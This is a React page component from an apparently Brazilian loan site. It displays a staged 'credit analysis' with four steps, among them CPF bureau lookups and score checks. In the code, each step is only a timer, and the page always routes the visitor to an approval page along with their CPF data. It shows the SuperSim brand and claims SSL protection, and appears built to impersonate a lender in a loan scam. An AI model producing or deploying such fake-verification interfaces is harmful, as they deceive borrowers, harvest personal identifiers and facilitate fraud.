import { useState, useEffect, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import Footer from "@/components/Footer";
import logo from "@/assets/logo.png";
import bannerEmprestimo from "@/assets/banner-emprestimo-hd.webp";
import { ShieldCheck, CheckCircle2, Search, FileCheck, BadgeDollarSign, Loader2, Lock } from "lucide-react";
import logoSupersim from "@/assets/logo-supersim.png";

const analysisSteps = [
  { label: "Consultando CPF nos órgãos de proteção...", icon: Search, duration: 4000 },
  { label: "Analisando histórico de crédito...", icon: FileCheck, duration: 5000 },
  { label: "Verificando score de crédito...", icon: ShieldCheck, duration: 4500 },
  { label: "Calculando limite disponível...", icon: BadgeDollarSign, duration: 3500 },
];

const AnaliseCredito = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const cpfData = location.state?.cpfData;
  const cpfDigits = location.state?.cpfDigits;
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState<number[]>([]);
  const [pulse, setPulse] = useState(false);

  const handleComplete = useCallback(() => {
    setTimeout(() => {
      navigate("/aprovado", { state: { cpfData, cpfDigits } });
    }, 800);
  }, [navigate, cpfData, cpfDigits]);

  useEffect(() => {
    let stepIndex = 0;

    const runStep = () => {
      if (stepIndex >= analysisSteps.length) {
        handleComplete();
        return;
      }
      setCurrentStep(stepIndex);
      setTimeout(() => {
        setCompletedSteps((prev) => [...prev, stepIndex]);
        stepIndex++;
        runStep();
      }, analysisSteps[stepIndex].duration);
    };

    const timer = setTimeout(() => runStep(), 500);
    return () => clearTimeout(timer);
  }, [handleComplete]);

  useEffect(() => {
    const interval = setInterval(() => setPulse((p) => !p), 1500);
    return () => clearInterval(interval);
  }, []);

  const progress = (completedSteps.length / analysisSteps.length) * 100;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      {/* Header */}
      <header className="py-4 flex justify-center bg-background border-b border-border/50">
        <img src={logo} alt="Logo" className="h-10 md:h-12" />
      </header>

      {/* Banner */}
      <div className="w-full">
        <img src={bannerEmprestimo} alt="Empréstimo rápido e fácil" className="w-full h-auto" />
      </div>

      <main className="flex-1 flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-lg space-y-6">
          {/* Card container */}
          <div className="bg-card rounded-3xl shadow-xl border border-border/40 p-6 md:p-8 space-y-6">
            {/* Animated shield icon */}
            <div className="text-center space-y-3">
              <div className={`w-28 h-28 rounded-full mx-auto flex items-center justify-center transition-all duration-700 ${
                pulse ? "bg-primary/15 scale-110" : "bg-primary/5 scale-100"
              }`}
              style={{
                boxShadow: pulse 
                  ? "0 0 40px hsl(36 97% 60% / 0.4), 0 0 80px hsl(36 97% 60% / 0.15)" 
                  : "0 0 15px hsl(36 97% 60% / 0.1)"
              }}>
                <img 
                  src={logoSupersim} 
                  alt="SuperSim" 
                  className={`w-16 h-16 object-contain transition-transform duration-700 ${pulse ? "scale-110" : "scale-100"}`} 
                />
              </div>
              <h1 className="text-2xl md:text-3xl font-extrabold text-foreground">Análise de Crédito</h1>
              <p className="text-muted-foreground text-sm md:text-base">Aguarde enquanto analisamos seu perfil de forma segura...</p>
            </div>

            {/* Steps */}
            <div className="space-y-3">
              {analysisSteps.map((step, idx) => {
                const StepIcon = step.icon;
                const isDone = completedSteps.includes(idx);
                const isActive = idx === currentStep && !isDone;

                return (
                  <div
                    key={idx}
                    className={`flex items-center gap-4 px-4 py-3.5 rounded-2xl transition-all duration-500 border ${
                      isDone
                        ? "bg-green-50 dark:bg-green-950/30 border-green-200 dark:border-green-800/40"
                        : isActive
                        ? "bg-primary/5 border-primary/20 shadow-md"
                        : "border-transparent opacity-30"
                    }`}
                  >
                    <div className={`w-11 h-11 rounded-xl flex items-center justify-center shrink-0 transition-all duration-500 ${
                      isDone
                        ? "bg-green-100 dark:bg-green-900/40"
                        : isActive
                        ? "bg-primary/10"
                        : "bg-muted"
                    }`}>
                      {isDone ? (
                        <CheckCircle2 className="w-6 h-6 text-green-500 animate-in zoom-in duration-300" />
                      ) : isActive ? (
                        <Loader2 className="w-6 h-6 text-primary animate-spin" />
                      ) : (
                        <StepIcon className="w-5 h-5 text-muted-foreground" />
                      )}
                    </div>
                    <div className="flex-1 min-w-0">
                      <span
                        className={`text-sm md:text-base font-semibold block ${
                          isDone
                            ? "text-green-700 dark:text-green-400"
                            : isActive
                            ? "text-foreground"
                            : "text-muted-foreground"
                        }`}
                      >
                        {step.label}
                      </span>
                      {isDone && (
                        <span className="text-xs text-green-600 dark:text-green-500 font-medium animate-in fade-in duration-300">
                          Concluído com sucesso
                        </span>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Progress bar */}
            <div className="space-y-2">
              <div className="flex justify-between text-xs font-semibold text-muted-foreground">
                <span>Progresso da análise</span>
                <span>{Math.round(progress)}%</span>
              </div>
              <div className="w-full h-3.5 bg-muted rounded-full overflow-hidden shadow-inner">
                <div
                  className="h-full rounded-full transition-all duration-700 ease-out bg-gradient-to-r from-[hsl(36,97%,55%)] via-[hsl(30,95%,50%)] to-[hsl(350,80%,55%)]"
                  style={{ width: `${progress}%` }}
                />
              </div>
            </div>
          </div>

          {/* Security badge */}
          <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
            <Lock className="w-3.5 h-3.5" />
            <span>Análise protegida por criptografia SSL de ponta a ponta</span>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default AnaliseCredito;
